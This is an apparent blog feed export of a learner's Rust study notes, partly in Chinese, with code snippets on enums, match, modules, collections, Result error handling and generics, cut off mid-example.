<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[derive(Debug)]</span><br><span class="line">enum UsState &#123;</span><br><span class="line">    Alabama,</span><br><span class="line">    Alaska,</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum Coin &#123;</span><br><span class="line">    Penny,</span><br><span class="line">    Nickel,</span><br><span class="line">    Dime,</span><br><span class="line">    Quarter(UsState),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; <span class="number">1</span>,</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter(state) =&gt; &#123;</span><br><span class="line">            println!(<span class="string">&quot;State quarter from &#123;:?&#125;!&quot;</span>, state); //得到coin里quarter里的usstate值</span><br><span class="line">            <span class="number">25</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    value_in_cents(Coin::Quarter(UsState::Alaska));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用option<T></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    fn plus_one(x: Option&lt;i32&gt;) -&gt; Option&lt;i32&gt; &#123;</span><br><span class="line">        match x &#123;</span><br><span class="line">            None =&gt; None,</span><br><span class="line">            Some(i) =&gt; Some(i + <span class="number">1</span>),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let five = Some(<span class="number">5</span>);</span><br><span class="line">    let six = plus_one(five);</span><br><span class="line">    let none = plus_one(None);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>Combining match and enums</code> is useful in many situations.<br>match against an enum, <code>bind a variable to the data inside,</code> and then execute code based on it.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_u8_value = <span class="number">0</span>u8;</span><br><span class="line">    match some_u8_value &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; println!(<span class="string">&quot;one&quot;</span>),</span><br><span class="line">        <span class="number">3</span> =&gt; println!(<span class="string">&quot;three&quot;</span>),</span><br><span class="line">        <span class="number">5</span> =&gt; println!(<span class="string">&quot;five&quot;</span>),</span><br><span class="line">        <span class="number">7</span> =&gt; println!(<span class="string">&quot;seven&quot;</span>),</span><br><span class="line">        _ =&gt; (),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>_</code>省略The _ pattern will match any value.<code>The () is just the unit value</code></p>
<h3 id="if-let"><a href="#if-let" class="headerlink" title="if let"></a>if let</h3><p>care about only one of the cases. For this situation, Rust provides if let.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_u8_value = Some(<span class="number">0</span>u8);</span><br><span class="line">    <span class="keyword">if</span> let Some(<span class="number">3</span>) = some_u8_value &#123;</span><br><span class="line">        println!(<span class="string">&quot;three&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let coin = Coin::Penny;</span><br><span class="line">    let mut count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> let Coin::Quarter(state) = coin &#123;</span><br><span class="line">        println!(<span class="string">&quot;State quarter from &#123;:?&#125;!&quot;</span>, state);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let coin = Coin::Penny;</span><br><span class="line">    let mut count = <span class="number">0</span>;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Quarter(state) =&gt; println!(<span class="string">&quot;State quarter from &#123;:?&#125;!&quot;</span>, state),</span><br><span class="line">        _ =&gt; count += <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="packages-gt-crates-gt-modules"><a href="#packages-gt-crates-gt-modules" class="headerlink" title="packages&gt;crates&gt;modules"></a>packages&gt;crates&gt;modules</h3><p> A package is<code>one or more crates</code>that provide a set of functionality. A package contains a Cargo.toml file that describes how to build those crates.<br>A package must contain zero or one library crates, and no more. It can contain as many binary crates as you’d like, but it must <code>contain at least one crate</code> (either library or binary).<br>If a package <code>contains src/main.rs and src/lib.rs, it has two crates: a library and a binary,</code> both with the same name as the package.<br>A package can<code>have multiple binary crates by placing files in the src/bin directory:</code>each file will be a separate binary crate.</p>
<p>the <code>use</code> keyword that brings a path into scope; and the <code>pub</code> keyword to make items public. We’ll also discuss the as keyword, external packages, and the glob operator</p>
<p>Modules let us organize code within a crate into groups</p>
<p>Create a new library named restaurant by running <code>cargo new --lib </code>restaurant;<br>crate //implicit module  src/main.rs and src/lib.rs 产生<br> └── front_of_house<br>     ├── hosting<br>     │   ├── add_to_waitlist<br>     │   └── seat_at_table<br>     └── serving<br>         ├── take_order<br>         ├── serve_order<br>         └── take_payment</p>
<p> If we want to call a function, we need to know its path.<br>A path can take two forms:</p>
<p>An <code>absolute path</code> starts from a crate root by using a crate name or a literal crate.<br>A <code>relative path </code>starts from the current module and uses self, super, or an identifier in the current module.<br>Both absolute and relative paths are followed by one or more identifiers separated by double colons (<code>::</code>).</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    mod hosting &#123;</span><br><span class="line">        fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    // Absolute path</span><br><span class="line">    crate::front_of_house::hosting::add_to_waitlist();</span><br><span class="line"></span><br><span class="line">    // Relative path</span><br><span class="line">    front_of_house::hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The way privacy works in Rust is that all items (<code>functions, methods, structs, enums, modules, and constants) are private by default</code>.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125; //making the module public doesn’t make its contents public. </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    // Absolute path</span><br><span class="line">    crate::front_of_house::hosting::add_to_waitlist();</span><br><span class="line"></span><br><span class="line">    // Relative path</span><br><span class="line">    front_of_house::hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn serve_order() &#123;&#125;</span><br><span class="line"></span><br><span class="line">mod back_of_house &#123;</span><br><span class="line">    fn fix_incorrect_order() &#123;</span><br><span class="line">        cook_order();</span><br><span class="line">        super::serve_order();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fn cook_order() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p> Enums aren’t very useful unless their variants are public; it would be annoying to have to annotate all enum variants with pub in every case, so the <code>default for enum variants is to be public. </code>Structs are often useful without their fields being public, so struct fields follow the general rule of <code>everything being private by default</code> unless annotated with pub.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">use</span><br><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">use crate::front_of_house::hosting;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">use self::front_of_house::hosting;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="as"><a href="#as" class="headerlink" title="as"></a>as</h3><p>There’s another solution to the problem of bringing two types of the same name into the same scope with use: after the path, we can specify <code>as and a new local name</code>, or alias, for the type.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">![allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::fmt::Result;</span><br><span class="line">use std::io::Result as IoResult;</span><br><span class="line"></span><br><span class="line">fn function1() -&gt; Result &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn function2() -&gt; IoResult&lt;()&gt; &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>this technique is called re-exporting because we’re bringing an item into scope but also making that item available for others to bring into their scope</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub use crate::front_of_house::hosting;  //其他可以 另外创立一个链接</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::collections::HashMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This is an absolute path starting with std, the name of the standard library crate.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">use rand::Rng;</span><br><span class="line">// --snip--</span><br><span class="line">use std::&#123;cmp::Ordering, io&#125;;</span><br><span class="line">// --snip--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::io::&#123;self, Write&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::collections::*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> brings all public items </p>
<p>The <code>mod</code> keyword declares modules, and Rust looks in a file with the same name as the module for the code that goes into that module.</p>
<h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let v: Vec&lt;i32&gt; = Vec::new();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]; //类别自己推测</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut v = Vec::new();</span><br><span class="line"></span><br><span class="line">    v.push(<span class="number">5</span>);</span><br><span class="line">    v.push(<span class="number">6</span>);</span><br><span class="line">    v.push(<span class="number">7</span>);</span><br><span class="line">    v.push(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        // do stuff with v</span><br><span class="line">    &#125; // &lt;- v goes out of scope and is freed here</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    let third: &amp;i32 = &amp;v[<span class="number">2</span>];</span><br><span class="line">    println!(<span class="string">&quot;The third element is &#123;&#125;&quot;</span>, third);</span><br><span class="line"></span><br><span class="line">    match v.get(<span class="number">2</span>) &#123; //gives us an Option&lt;&amp;<span class="built_in">T</span>&gt;.</span><br><span class="line">        Some(third) =&gt; println!(<span class="string">&quot;The third element is &#123;&#125;&quot;</span>, third),</span><br><span class="line">        None =&gt; println!(<span class="string">&quot;There is no third element.&quot;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut v = vec![<span class="number">100</span>, <span class="number">32</span>, <span class="number">57</span>];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> &amp;mut v &#123;</span><br><span class="line">        *i += <span class="number">50</span>; //解引用 dereference operator (*) to get to the value <span class="keyword">in</span> i</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum SpreadsheetCell &#123;</span><br><span class="line">        Int(i32),</span><br><span class="line">        Float(f64),</span><br><span class="line">        Text(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let row = vec![  //vec类型为SpreadsheetCell 实际上存储不同类型值</span><br><span class="line">        SpreadsheetCell::Int(<span class="number">3</span>),</span><br><span class="line">        SpreadsheetCell::Text(String::from(<span class="string">&quot;blue&quot;</span>)),</span><br><span class="line">        SpreadsheetCell::Float(<span class="number">10.12</span>),</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>枚举要配合match使用</p>
<h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>Remember that<code>strings are UTF-8</code>encoded, </p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let hello = String::from(<span class="string">&quot;السلام عليكم&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Dobrý den&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;שָׁלוֹם&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;नमस्ते&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;こんにちは&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;안녕하세요&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;你好&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Olá&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Здравствуйте&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Hola&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    s.push_str(<span class="string">&quot;bar&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">    s.push(<span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>push method takes<code>a single character</code></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">&quot;Hello, &quot;</span>);</span><br><span class="line">    let s2 = String::from(<span class="string">&quot;world!&quot;</span>);</span><br><span class="line">    let s3 = s1 + &amp;s2; // note s1 has been moved here and can no longer be used//be moved into the add <span class="built_in">call</span> and no longer be valid after that.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> add is that the compiler can coerce the &amp;String argument into a &amp;str</p>
<h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">&quot;tic&quot;</span>);</span><br><span class="line">    let s2 = String::from(<span class="string">&quot;tac&quot;</span>);</span><br><span class="line">    let s3 = String::from(<span class="string">&quot;toe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    let s = format!(<span class="string">&quot;&#123;&#125;-&#123;&#125;-&#123;&#125;&quot;</span>, s1, s2, s3); //doesn’t take ownership of <span class="built_in">any</span> of its parameters.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utf-8 </code>可变字节 1-4字节，有些一个字节 有些4个字节</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">[allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">let hello = <span class="string">&quot;Здравствуйте&quot;</span>;</span><br><span class="line"></span><br><span class="line">let s = &amp;hello[<span class="number">0.</span>.4];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">c</span> <span class="keyword">in</span> <span class="string">&quot;नमस्ते&quot;</span>.chars() &#123;</span><br><span class="line">    println!(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="built_in">c</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">&quot;नमस्ते&quot;</span>.bytes() &#123; // returns each raw byte,</span><br><span class="line">    println!(<span class="string">&quot;&#123;&#125;&quot;</span>, b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="hashmap"><a href="#hashmap" class="headerlink" title="hashmap"></a>hashmap</h3><p><code>all of the keys</code> must have the<code> same type</code>, and all of the<code>values</code>must have the<code> same type.</code></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Blue&quot;</span>), <span class="number">10</span>);</span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Yellow&quot;</span>), <span class="number">50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let teams = vec![String::from(<span class="string">&quot;Blue&quot;</span>), String::from(<span class="string">&quot;Yellow&quot;</span>)];</span><br><span class="line">    let initial_scores = vec![<span class="number">10</span>, <span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    let mut scores: HashMap&lt;_, _&gt; =</span><br><span class="line">        teams.into_iter().zip(initial_scores.into_iter()).collect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>zip </code>method to create a vector of tuples<br><code>collect </code>method to turn that vector of tuples into a hash map,</p>
<p>For types that implement the <code>Copy trait</code>, like i32, the values<code> are copied into</code> the hash map. For owned values like String, the values will be moved and the hash map will be the <code>owner of those values</code></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line"></span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Blue&quot;</span>), <span class="number">10</span>);</span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Yellow&quot;</span>), <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    let team_name = String::from(<span class="string">&quot;Blue&quot;</span>);</span><br><span class="line">    let score = scores.get(&amp;team_name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Some(&amp;10). The result is wrapped in Some because get returns an Option&lt;&amp;V&gt;<br>no value get will return None.</p>
<pre><code>for (key, value) in &amp;scores &#123;
    println!(&quot;&#123;&#125;: &#123;&#125;&quot;, key, value);
&#125;</code></pre>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Blue&quot;</span>), <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    scores.entry(String::from(<span class="string">&quot;Yellow&quot;</span>)).or_insert(<span class="number">50</span>);  //entry检查值是否存在，返回Entry， or_insert是Entry的方法 <span class="built_in">return</span> a mutable reference to the value   没有值插入</span><br><span class="line">    scores.entry(String::from(<span class="string">&quot;Blue&quot;</span>)).or_insert(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;&#123;:?&#125;&quot;</span>, scores); //&#123;<span class="string">&quot;Yellow&quot;</span>: <span class="number">50</span>, <span class="string">&quot;Blue&quot;</span>: <span class="number">10</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let text = <span class="string">&quot;hello world wonderful world&quot;</span>;</span><br><span class="line"></span><br><span class="line">    let mut map = HashMap::new();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> text.split_whitespace() &#123;</span><br><span class="line">        let count = map.entry(word).or_insert(<span class="number">0</span>); //or_insert method actually returns a mutable reference (&amp;mut V) 所以可以加<span class="number">1</span></span><br><span class="line">        *count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;&#123;:?&#125;&quot;</span>, map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <tags>
        <tag>RUST</tag>
      </tags>
  </entry>
  <entry>
    <title>RUST学习4</title>
    <url>/2020/08/14/RUST%E5%AD%A6%E4%B9%A04/</url>
    <content><![CDATA[<h3 id="Result-lt-T-E-gt"><a href="#Result-lt-T-E-gt" class="headerlink" title="Result&lt;T, E&gt;"></a>Result<code>&lt;T, E&gt;</code></h3><p>Rust doesn’t have exceptions. Instead, it has the type<code> Result&lt;T, E&gt;</code> for recoverable errors and the panic! macro that stops execution when the program encounters an unrecoverable error. </p>
<p>When the <code>panic! </code>macro executes, your program will print a failure message, unwind and clean up the stack, and then quit. </p>
<a id="more"></a>
<p>result enum is defined as having two variants<code>, Ok and Err,</code></p>
<p>The Result&lt;T, E&gt; type has many helper methods defined on it to do various tasks. One of those methods, called <code>unwrap</code>, is a shortcut method that is implemented <code>just like the match </code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">use std::fs::File;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let f = File::open(<span class="string">&quot;hello.txt&quot;</span>).unwrap();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">use std::fs::File;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let f = File::open(<span class="string">&quot;hello.txt&quot;</span>).expect(<span class="string">&quot;Failed to open hello.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Propagating Errors</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123;</span><br><span class="line">let f = File::open(<span class="string">&quot;hello.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    let mut f = match f &#123;</span><br><span class="line">        Ok(file) =&gt; file,</span><br><span class="line">        Err(e) =&gt; <span class="keyword">return</span> Err(e),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>A Shortcut for Propagating Errors: the ? Operator<br>The<code>?</code>placed after a Result value is defined to work in almost the same way as the match expressions </p>
<p> If the value of the Result is an Ok, the value inside the Ok will get returned from this expression, and the program will continue. If the value is an Err, the Err will be returned from the whole function as if we had used the return keyword so the error value gets propagated to the calling code.</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">File::open(<span class="string">&quot;hello.txt&quot;</span>)<span class="string">?.</span>read_to_string(&amp;mut s)?;</span><br><span class="line">Ok(s)</span><br></pre></td></tr></table></figure>


<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123;</span><br><span class="line">    fs::read_to_string(<span class="string">&quot;hello.txt&quot;</span>)</span><br></pre></td></tr></table></figure>


<p> If you can ensure by manually inspecting the code that you’ll never have an Err variant, it’s perfectly acceptable to call<code> unwrap.</code> Here’s an example:</p>
<h3 id="Generic-泛型"><a href="#Generic-泛型" class="headerlink" title="Generic 泛型"></a>Generic 泛型</h3><p>将代码抽取出来，减少重复代码</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn largest&lt;T&gt;(<span class="symbol">list:</span> &amp;[T]) -&gt; T &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct Point&lt;T, U&gt; &#123; <span class="regexp">//</span>T U代表不同的类型</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> U,</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    let both_integer = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10</span> &#125;;</span><br><span class="line">    let both_float = Point &#123; <span class="symbol">x:</span> <span class="number">1.0</span>, <span class="symbol">y:</span> <span class="number">4.0</span> &#125;;</span><br><span class="line">    let integer_and_float = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">4.0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>where T was filled in with the type std::fs::File when the file was opened successfully and E was filled in with the type std::io::Error when there were problems opening the file.</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">struct Point&lt;T&gt; &#123;</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> T,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl&lt;T&gt; Point&lt;T&gt; &#123;</span><br><span class="line">    fn x(&amp;<span class="keyword">self</span>) -&gt; &amp;T &#123;</span><br><span class="line">        &amp;<span class="keyword">self</span>.x</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let p = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10</span> &#125;;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;p.x = &#123;&#125;&quot;</span>, p.x());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Note that we have to declare <code>T just after impl </code>so we can use it to specify that we’re implementing methods on the type Point<T>.</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">struct Point&lt;T, U&gt; &#123;</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> U,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl&lt;T, U&gt; Point&lt;T, U&gt; &#123;</span><br><span class="line">    fn mixup&lt;V, W&gt;(<span class="keyword">self</span>, <span class="symbol">other:</span> Point&lt;V, W&gt;) -&gt; Point&lt;T, W&gt; &#123;</span><br><span class="line">        Point &#123;</span><br><span class="line">            <span class="symbol">x:</span> <span class="keyword">self</span>.x,</span><br><span class="line">            <span class="symbol">y:</span> other.y,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let p1 = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10.4</span> &#125;;</span><br><span class="line">    let p2 = Point &#123; <span class="symbol">x:</span> <span class="string">&quot;Hello&quot;</span>, <span class="symbol">y:</span> <span class="string">&#x27;c&#x27;</span> &#125;;</span><br><span 